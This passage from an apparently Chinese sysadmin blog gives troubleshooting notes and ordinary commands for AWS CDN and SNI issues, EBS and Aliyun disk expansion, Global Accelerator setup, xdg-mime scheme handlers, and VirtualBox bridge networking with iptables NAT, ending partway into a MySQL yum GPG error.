  <a href="#%e4%ba%9a%e9%a9%ac%e9%80%8acdn-%e6%b7%bb%e5%8a%a0-elb-%e4%bd%9c%e4%b8%ba%e5%90%8e%e7%ab%af%e6%ba%90%e6%8c%87%e5%ae%9a%e5%a4%9a%e5%a4%87%e7%94%a8%e5%9f%9f%e5%90%8d%e6%97%a0%e6%95%88%e6%9c%89%e5%85%b6%e4%bb%96%e8%a1%8d%e7%94%9f%e9%97%ae%e9%a2%98-%e5%be%85%e7%bb%a7%e7%bb%ad%e6%b5%8b%e8%af%95" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><ul>
<li>问题体现: 亚马逊添加<code>cdn</code>分配后，指向源站为<code>elb</code>，此时<code>cdn</code>配置多个备用域名，正常解析后，无论访问的是哪个备用域名，他们请求的最终站点始终是一个。</li>
<li>问题分析:
<ul>
<li>怀疑是<code>sni</code>的问题，<code>elb</code>和<code>cdn</code>这边所使用的证书都是通配符证书, 而在请求过程中，携带的<code>sni</code>只有主域名，而上述问题中请求到的最终站点，恰好又是<code>nginx</code>中配置的第一个。</li>
</ul>
</li>
<li>解决方案:
<ul>
<li>为每一个<code>cdn</code>备用域名添加一个独立的<code>cdn</code></li>
</ul>
</li>
</ul>
<h2 id="亚马逊调整-ebs-卷大小后扩展文件系统磁盘扩容" class="heading-element"><span>亚马逊调整 EBS 卷大小后扩展文件系统(磁盘扩容)</span>
  <a href="#%e4%ba%9a%e9%a9%ac%e9%80%8a%e8%b0%83%e6%95%b4-ebs-%e5%8d%b7%e5%a4%a7%e5%b0%8f%e5%90%8e%e6%89%a9%e5%b1%95%e6%96%87%e4%bb%b6%e7%b3%bb%e7%bb%9f%e7%a3%81%e7%9b%98%e6%89%a9%e5%ae%b9" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">### https://docs.aws.amazon.com/zh_cn/ebs/latest/userguide/recognize-expanded-volume-linux.html</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">## 1. 检查卷是否有分区</span>
</span></span><span class="line"><span class="cl">$&gt; sudo lsblk
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">## 2. 扩展分区</span>
</span></span><span class="line"><span class="cl"><span class="c1"># $&gt; sudo growpart 需要扩展的盘 1</span>
</span></span><span class="line"><span class="cl">$&gt; sudo growpart /dev/nvme0n1 <span class="m">1</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">## 3. 扩展文件系统</span>
</span></span><span class="line"><span class="cl"><span class="c1"># xfs</span>
</span></span><span class="line"><span class="cl">$&gt; sudo xfs_growfs -d / 
</span></span><span class="line"><span class="cl"><span class="c1"># ext4</span>
</span></span><span class="line"><span class="cl"><span class="c1"># $&gt; sudo resize2fs &lt;挂载分区名&gt;</span>
</span></span><span class="line"><span class="cl">$&gt; sudo resize2fs /dev/nvme0n1p1</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="亚马逊加速器配置" class="heading-element"><span>亚马逊加速器配置</span>
  <a href="#%e4%ba%9a%e9%a9%ac%e9%80%8a%e5%8a%a0%e9%80%9f%e5%99%a8%e9%85%8d%e7%bd%ae" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><blockquote>
<p><a href="https://docs.aws.amazon.com/zh_cn/global-accelerator/latest/dg/what-is-global-accelerator.html"target="_blank" rel="external nofollow noopener noreferrer">https://docs.aws.amazon.com/zh_cn/global-accelerator/latest/dg/what-is-global-accelerator.html<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></p>
</blockquote>
<p><code>AWS Global Accelerator</code>可以提高全球受众使用的 <code>Internet</code> 应用程序的可用性。使用标准加速器，全球加速器将 <code>AWS</code> 全球网络的流量引导到离客户端最近的区域中的终端节点。 本节主要说明<code>标准加速</code></p>
<ul>
<li>案例: 我的服务器位于新加坡，在欧洲等其他地区访问新加坡服务器上站点很慢，正常来说，针对于站点加速应该优先使用<code>cdn</code>，但是我们的站点主要是提供<code>api</code>请求等动态的服务, 很少涉及静态资源缓存。所有选择<code>AWS Global Accelerator</code>。</li>
<li>创建步骤(登陆<code>aws</code>后，选择 <code>Global Accelerator</code>服务， 点击<code>创建加速器</code>):
<ul>
<li><code>输入名称</code>： 输入<code>加速器名称</code>, <code>加速器类型</code>选择标准, 其他根据需求修改， 点击<code>下一步</code>。</li>
<li><code>侦听器</code>：录入<code>端口</code>、<code>协议</code>、<code>客户端亲和性</code> ，其中<code>端口</code>为后端对应的端口(比如我是加速后端<code>80</code>，这儿填写的就是<code>80</code>，建议一个端口一个监听器)</li>
<li><code>添加端点组</code>： 修改<code>端点组1</code>中的<code>区域</code>(<code>区域</code>对应的就是你需要加速的目标区域，比如我的是新加坡,这儿选择的就是新加坡<code>ap-southeast-1</code>)，其他配置默认即可。点击<code>下一步</code>。</li>
<li><code>添加端点</code>： 点击<code>添加端点</code>, 修改<code>端点类型</code>，你后端是什么就选择什么，<code>端点类型</code>选择过后，<code>端点</code>会自动加载已有的资源信息，其他默认。 点击<code>创建加速器</code> 即完成创建。</li>
</ul>
</li>
</ul>
<p><code>加速器</code>创建完成后会提供一个<code>dns</code>地址，将需要加速的域名直接解析上去即可。</p>
<p><code>AWS Global Accelerator</code>的功能和<code>cdn</code>类似，但效果比<code>cdn</code>好, 费用肯定要更高一些了。他还可以实现端口转发等其他的功能，可以自行参悟。</p>
<h2 id="阿里云磁盘分区扩容" class="heading-element"><span>阿里云磁盘分区扩容</span>
  <a href="#%e9%98%bf%e9%87%8c%e4%ba%91%e7%a3%81%e7%9b%98%e5%88%86%e5%8c%ba%e6%89%a9%e5%ae%b9" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><blockquote>
<p><a href="https://help.aliyun.com/zh/ecs/user-guide/step-2-resize-partitions-and-file-systems/?spm=a2c4g.11186623.0.0.5a193a8aP9JIh1"target="_blank" rel="external nofollow noopener noreferrer">https://help.aliyun.com/zh/ecs/user-guide/step-2-resize-partitions-and-file-systems/?spm=a2c4g.11186623.0.0.5a193a8aP9JIh1<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></p>
</blockquote>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 确认分区信息</span>
</span></span><span class="line"><span class="cl">$&gt; sudo fdisk -lu
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 扩容分区</span>
</span></span><span class="line"><span class="cl"><span class="c1">## 命令参数中的 /dev/vdb 和 1 之间需要空格分隔，1是分区编号, 是需要扩容的盘。</span>
</span></span><span class="line"><span class="cl">$&gt; <span class="nb">type</span> growpart <span class="o">||</span> sudo yum install -y cloud-utils-growpart
</span></span><span class="line"><span class="cl">$&gt; sudo yum update cloud-utils-growpart
</span></span><span class="line"><span class="cl">$&gt; <span class="nb">type</span> sgdisk <span class="o">||</span> sudo yum install -y gdisk
</span></span><span class="line"><span class="cl">$&gt; sudo <span class="nv">LC_ALL</span><span class="o">=</span>en_US.UTF-8 growpart /dev/vdb <span class="m">1</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 扩容盘</span>
</span></span><span class="line"><span class="cl"><span class="c1">## xfs 扩容 ,  /mnt 是挂载的目录 </span>
</span></span><span class="line"><span class="cl">$&gt; <span class="nb">type</span> xfs_growfs <span class="o">||</span> sudo yum install -y xfsprogs
</span></span><span class="line"><span class="cl">$&gt; sudo xfs_growfs /mnt
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">## ext 扩容</span>
</span></span><span class="line"><span class="cl">$&gt; sudo resize2fs /dev/vdb1
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">########################################## </span>
</span></span><span class="line"><span class="cl"><span class="c1">## 裸盘扩容 </span>
</span></span><span class="line"><span class="cl">$&gt; sudo resize2fs /dev/vdc </span></span></code></pre></td></tr></table>
</div>
</div><h2 id="网络故障记录" class="heading-element"><span>网络故障记录</span>
  <a href="#%e7%bd%91%e7%bb%9c%e6%95%85%e9%9a%9c%e8%ae%b0%e5%bd%95" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><ul>
<li><code>症状</code>：局域网机器网络故障，时好时坏。故障时候无法<code>ping</code>通网关(无法获取响应)，但可以<code>ping</code>通同网段的其他主机，也可以与其他主机正常通信。</li>
<li><code>原因</code>：当前主机是通过手动配置<code>ip</code>，而局域网<code>ip</code>是路由自动分配的，有其他同事在连接时候占用了当前主机配置的<code>ip</code>，从而<code>ip</code>重复导致了上诉问题。</li>
</ul>
<h2 id="linux-桌面环境下绑定指定唤起协议" class="heading-element"><span>linux 桌面环境下，绑定指定唤起协议</span>
  <a href="#linux-%e6%a1%8c%e9%9d%a2%e7%8e%af%e5%a2%83%e4%b8%8b%e7%bb%91%e5%ae%9a%e6%8c%87%e5%ae%9a%e5%94%a4%e8%b5%b7%e5%8d%8f%e8%ae%ae" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><ul>
<li>例如 <code>mailto://</code> 唤起指定的邮件应用,下面以<code>he3</code>的<code>appimage</code>程序为例</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 创建一个desktop文件(~/.local/share/applications)</span>
</span></span><span class="line"><span class="cl">$&gt; vim ~/.local/share/applications/appimagekit-he3.desktop 
</span></span><span class="line"><span class="cl"><span class="o">[</span>Desktop Entry<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="nv">Name</span><span class="o">=</span>He3
</span></span><span class="line"><span class="cl"><span class="nv">Comment</span><span class="o">=</span>He3 desktop
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">X-AppImage-Version<span class="o">=</span>5.0.4
</span></span><span class="line"><span class="cl"><span class="nv">Exec</span><span class="o">=</span>/opt/tools/he3/he3.appImage %U
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">Icon</span><span class="o">=</span>/opt/tools/he3/he3.png
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">Terminal</span><span class="o">=</span><span class="nb">false</span>
</span></span><span class="line"><span class="cl"><span class="nv">Type</span><span class="o">=</span>Application
</span></span><span class="line"><span class="cl"><span class="nv">Categories</span><span class="o">=</span>Application<span class="p">;</span>Development<span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">StartupNotify</span><span class="o">=</span><span class="nb">true</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 主要是这个 MimeType, he3 即为相关协议(浏览器请求 he3:// 打开此程序)</span>
</span></span><span class="line"><span class="cl"><span class="nv">MimeType</span><span class="o">=</span>x-scheme-handler/he3<span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 绑定协议到指定的应用上</span>
</span></span><span class="line"><span class="cl">$&gt; xdg-mime default appimagekit-he3.desktop x-scheme-handler/he3
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 查询已绑定的信息 </span>
</span></span><span class="line"><span class="cl">$&gt; xdg-mime query default x-scheme-handler/he3</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="解决-virtualbox-仅主机模式无法定制ip网段的问题仅主机模式无法连接公网的问题" class="heading-element"><span>解决 Virtualbox 仅主机模式无法定制IP网段的问题(仅主机模式无法连接公网的问题)</span>
  <a href="#%e8%a7%a3%e5%86%b3-virtualbox-%e4%bb%85%e4%b8%bb%e6%9c%ba%e6%a8%a1%e5%bc%8f%e6%97%a0%e6%b3%95%e5%ae%9a%e5%88%b6ip%e7%bd%91%e6%ae%b5%e7%9a%84%e9%97%ae%e9%a2%98%e4%bb%85%e4%b8%bb%e6%9c%ba%e6%a8%a1%e5%bc%8f%e6%97%a0%e6%b3%95%e8%bf%9e%e6%8e%a5%e5%85%ac%e7%bd%91%e7%9a%84%e9%97%ae%e9%a2%98" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p><strong>此方案只适合<code>linux</code>桌面系统，<code>windows</code>理论可参考设定</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 创建一个虚拟网桥</span>
</span></span><span class="line"><span class="cl">$&gt; sudo brctl addbr br-vbox0
</span></span><span class="line"><span class="cl"><span class="c1"># sudo ip link add name br-vbox0 type bridge</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 启用网桥和物理网卡</span>
</span></span><span class="line"><span class="cl">$&gt; sudo ip link <span class="nb">set</span> dev br-vbox0 up
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 为网桥设置IP地址(这个ip相当于这个网段的路由)</span>
</span></span><span class="line"><span class="cl">$&gt; sudo ip addr add 172.31.10.1/24 dev br-vbox0
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Virtualbox 创建虚拟机时候，网卡的连接方式改为桥连网卡, 然后选择创建的网桥 br-vbox0 即可(没有dhcp，需要自己手动配置服务器上的网卡信息) </span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">## 以上步骤完成，那么配置的虚拟机网络即为仅主机模式，且可以自定义网段 </span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">### 构建一个systemd管理脚本</span>
</span></span><span class="line"><span class="cl">$&gt; sudo vi /etc/systemd/system/create-bridge@.service
</span></span><span class="line"><span class="cl"><span class="o">[</span>Unit<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="nv">Description</span><span class="o">=</span>Create bridge br-vbox%i
</span></span><span class="line"><span class="cl"><span class="nv">After</span><span class="o">=</span>network.target
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>Service<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="nv">Type</span><span class="o">=</span>oneshot
</span></span><span class="line"><span class="cl"><span class="nv">ExecStart</span><span class="o">=</span>/usr/sbin/brctl addbr br-vbox%i
</span></span><span class="line"><span class="cl"><span class="nv">ExecStart</span><span class="o">=</span>/usr/sbin/ip link <span class="nb">set</span> dev br-vbox%i up
</span></span><span class="line"><span class="cl"><span class="nv">ExecStart</span><span class="o">=</span>/usr/sbin/ip addr add 172.31.1%i.1/24 dev br-vbox%i
</span></span><span class="line"><span class="cl"><span class="nv">ExecStop</span><span class="o">=</span>/usr/sbin/ip link <span class="nb">set</span> dev br-vbox%i down
</span></span><span class="line"><span class="cl"><span class="nv">ExecStop</span><span class="o">=</span>/usr/sbin/brctl delbr br-vbox%i
</span></span><span class="line"><span class="cl"><span class="nv">RemainAfterExit</span><span class="o">=</span>yes
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>Install<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="nv">WantedBy</span><span class="o">=</span>multi-user.target
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">$&gt; sudo systemctl daemon-reload 
</span></span><span class="line"><span class="cl"><span class="c1"># $&gt; sudo systemctl &lt;start|stop|status&gt; create-bridge@0.service</span>
</span></span><span class="line"><span class="cl"><span class="c1">### </span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">## 开始设置该模式下的主机可连接公网</span>
</span></span><span class="line"><span class="cl"><span class="c1">## 需要iptables支持，创建步骤和 https://blog.0x5c0f.cc/2019/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/#linux-%E4%B8%8B%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E4%B8%8A%E5%85%AC%E7%BD%91 一致 </span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 物理机执行</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 允许NAT功能和网络包的转发(wlp0s20f3 为可以连接公网的网卡)</span>
</span></span><span class="line"><span class="cl">$&gt; sudo iptables -t nat -A POSTROUTING -o wlp0s20f3 -j MASQUERADE
</span></span><span class="line"><span class="cl"><span class="c1"># 允许从内网到公网的数据包转发</span>
</span></span><span class="line"><span class="cl">$&gt; sudo iptables -A FORWARD -i br-vbox0 -o wlp0s20f3 -j ACCEPT
</span></span><span class="line"><span class="cl"><span class="c1"># 允许已经建立连接的流量转发</span>
</span></span><span class="line"><span class="cl">$&gt; sudo iptables -A FORWARD -i wlp0s20f3 -o br-vbox0 -m state --state RELATED,ESTABLISHED -j ACCEPT</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="grafana-查询错误-a-got-error-input-data-must-be-a-wide-series-but-got-type-long-input-refid" class="heading-element"><span>grafana 查询错误 <code>[A] got error: input data must be a wide series but got type long (input refid)</code></span>
  <a href="#grafana-%e6%9f%a5%e8%af%a2%e9%94%99%e8%af%af-a-got-error-input-data-must-be-a-wide-series-but-got-type-long-input-refid" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><ul>
<li>这个问题是在配置<code>grafana</code>警报规则时出现的，实际上这儿添加的是表达式，而不是查询标签，统计出来的结果只能是数字(看看<code>prometheus</code>的<code>graph</code>面板 )</li>
</ul>
<h2 id="通过yum安装的mysql进行升级的时候报错-xxx-fileetcpkirpm-gpgrpm-gpg-key-mysql" class="heading-element"><span>通过yum安装的mysql进行升级的时候报错 <code>xxx file:///etc/pki/rpm-gpg/RPM-GPG-KEY-mysql</code></span>
  <a href="#%e9%80%9a%e8%bf%87yum%e5%ae%89%e8%a3%85%e7%9a%84mysql%e8%bf%9b%e8%a1%8c%e5%8d%87%e7%ba%a7%e7%9a%84%e6%97%b6%e5%80%99%e6%8a%a5%e9%94%99-xxx-fileetcpkirpm-gpgrpm-gpg-key-mysql" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>这个错误多数出现在yum安装 <code>mysql5.6</code>、<code>5.7</code> 时<br>
问题:</p>
<div class="highlight"><div class="chroma">
